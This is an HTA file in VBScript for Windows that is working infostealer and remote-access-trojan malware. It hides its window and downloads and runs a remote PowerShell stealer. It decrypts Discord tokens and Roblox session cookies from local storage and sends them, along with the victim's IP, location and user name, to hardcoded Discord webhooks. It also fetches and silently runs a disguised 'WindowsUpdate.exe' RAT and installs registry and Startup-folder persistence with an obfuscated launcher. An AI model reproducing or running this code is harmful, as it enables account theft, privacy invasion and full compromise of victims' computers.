' language: VBScript/HTA, file: file.hta, target: Windows 10/11, mshta engine
<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" scroll="no" navigator="no"/>
<script language="VBScript">
window.resizeTo 1,1:window.moveTo -3000,-3000
On Error Resume Next

Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, lastCookie, foundToken, foundCookie
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

WH = "https://discord.com/api/webhooks/1573904916001456162/rxQeUCo6Rtg8_Xes7efwmybNHPHrl_WiOSWPwEEsqKb3PdbG2gsIQee8nR0plW5WV01F"
RE_WH = "https://discord.com/api/webhooks/1573905019235868795/1h-kB4PA8BOkVaMTWu4TU4Qd89AqPFtXkp9ipslf3GvhrUAjvmskSVfXA7KHJCDp0Lei"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")
ratDropped = False
lastCookie = ""

' --- 1. INITIAL (WH ONLY) ---
Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
Call IP(WH)

' Run steal.ps1 AND VBScript native backup
Call GrabTokens(WH)
Call GrabTokensNative(WH)

Call Persistence
Call PostCookieOnly(WH)
Call DropRAT(WH)

' --- 2. LOOP (RE_WH ONLY, NO RAT) ---
Dim runCount
runCount = 0
Do
    runCount = runCount + 1
    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
    Call GrabTokens(RE_WH)
    Call GrabTokensNative(RE_WH)
    Call IP(RE_WH)
    Call PostCookieOnly(RE_WH)
    Call SleepSeconds(30)
    Exit Do
Loop

window.close()

' --- GRAB TOKENS VIA STEAL.PS1 ---
Sub GrabTokens(targetWH)
    Dim xh, psData, psf, tf, cp, raw, lines, l
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    
    xh.Open "GET", "https://gist.githubusercontent.com/elibyexd-stack/cd284a4bd1bf045a820ebaeac2fd89fc/raw/4eac95e5238b7dce163f6d360e902605050d1954/steal.ps1", False
    xh.Send
    If xh.Status = 200 Then psData = xh.responseText
    Set xh = Nothing
    
    If Len(psData) > 100 Then
        psf = TmpFile("steal.ps1")
        WriteFile psf, psData

        tf = TmpFile("steal_result.txt")
        fso.DeleteFile tf, True

        ' Launch PS1 hidden
        sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, False

        ' Wait up to 15 seconds (gives PS1 time to write)
        Dim waited : waited = 0
        Do
            Call SleepSeconds(2)
            waited = waited + 2
            If fso.FileExists(tf) Then Exit Do
        Loop While waited < 15

        If fso.FileExists(tf) Then
            cp = TmpFile("sr_" & Int(Rnd()*99999) & ".txt")
            On Error Resume Next
            fso.CopyFile tf, cp, True
            On Error GoTo 0
            If Not fso.FileExists(cp) Then cp = tf

            raw = ReadFile(cp)
            If cp <> tf Then fso.DeleteFile cp, True
            
            If Len(raw) > 10 Then
                If Asc(Left(raw, 1)) = 239 Then raw = Mid(raw, 4)
                raw = Replace(raw, vbCrLf, vbLf)
                raw = Replace(raw, vbCr, vbLf)

                lines = Split(raw, vbLf)
                For Each l In lines
                    l = Trim(l)
                    If Left(l, 8) = "DISCORD|" Then
                        Dim p: p = Split(Mid(l, 9), "|")
                        If UBound(p) >= 4 Then
                            Dim info: info = "**User:** " & p(0) & vbCrLf
                            If p(1) <> "" Then info = info & "**Email:** " & p(1) & vbCrLf
                            If p(2) <> "" Then info = info & "**Phone:** " & p(2) & vbCrLf
                            If p(3) <> "" And p(3) <> "0" Then info = info & "**ID:** " & p(3) & vbCrLf
                            info = info & "**Token:** " & p(4)
                            Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
                            foundToken = True
                        End If
                    ElseIf Left(l, 9) = "ROBLOXMS|" Then
                        Dim c1: c1 = Mid(l, 10)
                        If Len(c1) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie (MS)", "Size: " & Len(c1) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c1 & "``", 10181046, targetWH)
                    ElseIf Left(l, 8) = "ROBLOX|" Then
                        Dim c2: c2 = Mid(l, 9)
                        If Len(c2) > 20 Then Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(c2) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & c2 & "``", 10181046, targetWH)
                    End If
                Next
            End If
        End If
    End If
End Sub

' --- NATIVE TOKEN GRABBER (BACKUP IF PS1 FAILS) ---
Sub GrabTokensNative(targetWH)
    If foundToken = True Then Exit Sub
    Dim appdata, paths, i, filePath, raw, mk, startPos, endPos, b64, token
    appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
    
    Dim lsPath : lsPath = appdata & "\discord\Local State"
    If fso.FileExists(lsPath) Then
        raw = ReadFile(lsPath)
        startPos = InStr(raw, """encrypted_key"":""") + 17
        If startPos > 17 Then
            endPos = InStr(startPos, raw, """")
            b64 = Mid(raw, startPos, endPos - startPos)
            mk = DecryptDPAPI(b64)
            If Len(mk) > 5 Then mk = Base64Encode(Mid(mk, 6))
        End If
    End If

    If Len(mk) > 0 Then
        paths = Array(appdata & "\discord\Local Storage\leveldb", appdata & "\discordptb\Local Storage\leveldb", appdata & "\discordcanary\Local Storage\leveldb")
        For i = 0 To UBound(paths)
            If fso.FolderExists(paths(i)) Then
                Dim folder, f
                Set folder = fso.GetFolder(paths(i))
                For Each f In folder.Files
                    If Right(f.Name, 4) = ".ldb" Or Right(f.Name, 4) = ".log" Then
                        raw = ReadFile(f.Path)
                        startPos = 1
                        Do
                            startPos = InStr(startPos, raw, "dQw4w9WgXcQ:")
                            If startPos = 0 Then Exit Do
                            startPos = startPos + 12
                            endPos = startPos
                            Do
                                Dim char : char = Mid(raw, endPos, 1)
                                If char = """" Or char = "\" Or Asc(char) < 32 Then Exit Do
                                endPos = endPos + 1
                                If endPos - startPos > 200 Then Exit Do
                            Loop
                            b64 = Mid(raw, startPos, endPos - startPos)
                            If Len(b64) > 40 Then
                                token = DecryptGCM(mk, b64)
                                If Len(token) > 30 Then 
                                    Call PostEmbedTo(":gift: Discord Token", "**Token:** " & token, 10181046, targetWH)
                                    foundToken = True
                                End If
                            End If
                        Loop
                    End If
                Next
            End If
        Next
    End If
End Sub

' --- NATIVE ROBLOX COOKIE (Backup) ---
Sub PostCookieOnly(targetWH)
    Dim cookie : cookie = GetRobloxCookie()
    If Len(cookie) < 20 Then Exit Sub
    If cookie = lastCookie Then Exit Sub
    lastCookie = cookie
    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
End Sub

Function GetRobloxCookie()
    GetRobloxCookie = ""
    Dim l, appdata, paths, i, fp, raw, startPos, endPos, b64
    l = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
    appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
    
    Dim checkPaths(4)
    checkPaths(0) = l & "\Roblox\LocalStorage\robloxcookies.dat"
    checkPaths(1) = l & "\Roblox\LocalStorage\RobloxCookies.dat"
    checkPaths(2) = appdata & "\Roblox\LocalStorage\robloxcookies.dat"
    checkPaths(3) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    checkPaths(4) = l & "\RobloxPCGDK\LocalStorage\RobloxCookies.dat"
    
    For i = 0 To 4
        If fso.FileExists(checkPaths(i)) Then fp = checkPaths(i) : Exit For
    Next
    
    If Len(fp) = 0 Then Exit Function
    raw = ReadFile(fp)
    
    If InStr(raw, "CookiesData"":""") > 0 Then
        startPos = InStr(raw, "CookiesData"":""") + 14
        endPos = InStr(startPos, raw, """")
        b64 = Mid(raw, startPos, endPos - startPos)
        GetRobloxCookie = DecryptDPAPI(b64)
    ElseIf InStr(raw, ".ROBLOSECURITY") > 0 Then
        startPos = InStr(raw, ".ROBLOSECURITY")
        GetRobloxCookie = Mid(raw, startPos, 2000)
    ElseIf InStr(raw, "_|WARNING") > 0 Then
        startPos = InStr(raw, "_|WARNING")
        GetRobloxCookie = Mid(raw, startPos, 2000)
    Else
        GetRobloxCookie = raw
    End If
    
    GetRobloxCookie = Replace(GetRobloxCookie, vbCr, "")
    GetRobloxCookie = Replace(GetRobloxCookie, vbLf, "")
    GetRobloxCookie = Replace(GetRobloxCookie, vbTab, "")
    GetRobloxCookie = Trim(GetRobloxCookie)
    Dim sc : sc = InStr(GetRobloxCookie, ";")
    If sc > 0 Then GetRobloxCookie = Left(GetRobloxCookie, sc - 1)
End Function

' --- RAT DROP (WH ONLY) ---
Sub DropRAT(targetWH)
    Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
    Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
    Randomize
    Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
    Dim op : op = tPath & "\" & fname
    If fso.FileExists(op) Then fso.DeleteFile op, True

    Call PostEmbedTo(":rocket: RAT Download", "Starting download...", 10181046, targetWH)
    Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
    sh.Run dlCmd, 0, True

    If fso.FileExists(op) Then
        Dim fSize : fSize = fso.GetFile(op).Size
        If fSize > 100000 Then
            Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
            Call PostEmbedTo(":rocket: RAT Download", "Downloaded: " & fSizeMB & " MB", 10181046, targetWH)
            Call RunCmd("""" & op & """")
            ratDropped = True
            Call SleepSeconds(2)
            Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed.", 10181046, targetWH)
        Else
            Call PostEmbedTo(":x: RAT Download", "File too small: " & fSize & " bytes", 16711680, targetWH)
        End If
    Else
        Call PostEmbedTo(":x: RAT Download", "Download failed (link expired)", 16711680, targetWH)
    End If
End Sub

Sub RunCmd(cmd)
    Dim w,p,i,s
    Set w = GetObject("winmgmts:\\.\root\cimv2")
    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
    s.ShowWindow = 0
    Set p = w.Get("Win32_Process")
    p.Create cmd,,s,i
End Sub

Sub IP(targetWH)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    If UBound(ll) < 3 Then Exit Sub
    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
    Call PostEmbedTo(":dart: Target", info, 10181046, targetWH)
    Set xh = Nothing
End Sub

Sub Persistence()
    Dim payload : payload = "mshta https://dicerigx.app/"
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
    Call PostEmbed(":pushpin: Persistence", "3 startup methods installed", 10181046)
End Sub

Sub SleepSeconds(s)
    Dim cmd : cmd = "cmd /c ping -n " & (s + 1) & " 127.0.0.1 > nul"
    sh.Run cmd, 0, True
End Sub

' --- HELPERS ---
Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub

Function ReadFile(path)
    ReadFile = ""
    On Error Resume Next
    Dim f: Set f = fso.OpenTextFile(path, 1)
    If Err.Number = 0 Then ReadFile = f.ReadAll
    On Error GoTo 0
    If Not f Is Nothing Then f.Close
    Set f = Nothing
End Function

Function DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    On Error Resume Next
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding ascii}catch{}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 5 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
    On Error GoTo 0
End Function

Function DecryptGCM(key, b64)
    DecryptGCM = ""
    Dim inf: inf = TmpFile("gcm.txt")
    Dim outf: outf = TmpFile("gcm_out.txt")
    On Error Resume Next
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "try{$k=[Convert]::FromBase64String('" & key & "');$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$n=$b[3..14];$c=$b[15..($b.Length-17)];$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$k;$aes.Mode='ECB';$aes.Padding='None';$e=$aes.CreateEncryptor();$o=New-Object byte[] $c.Length;$cb=New-Object byte[] 16;$n.CopyTo($cb,0);$cb[15]=2;for($i=0;$i -lt $c.Length;$i+=16){$kk=$e.TransformFinalBlock($cb,0,16);for($j=0;$j -lt [Math]::Min(16,$c.Length-$i);$j++){$o[$i+$j]=$c[$i+$j] -bxor $kk[$j]};for($j=15;$j -ge 12;$j--){$cb[$j]++;if($cb[$j] -ne 0){break}}};[Text.Encoding]::UTF8.GetString($o)|Out-File '" & outf & "' -Encoding ascii}catch{}"
    Dim psf: psf = TmpFile("gcm.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then DecryptGCM = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
    On Error GoTo 0
End Function

Function Base64Encode(str)
    Dim xml, node
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = str
    Base64Encode = node.text
    Set node = Nothing
    Set xml = Nothing
End Function

Sub PostEmbed(t, d, c)
    Call PostEmbedTo(t, d, c, WH)
End Sub

Sub PostEmbedTo(t, d, c, target_wh)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", target_wh, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
</body></html>
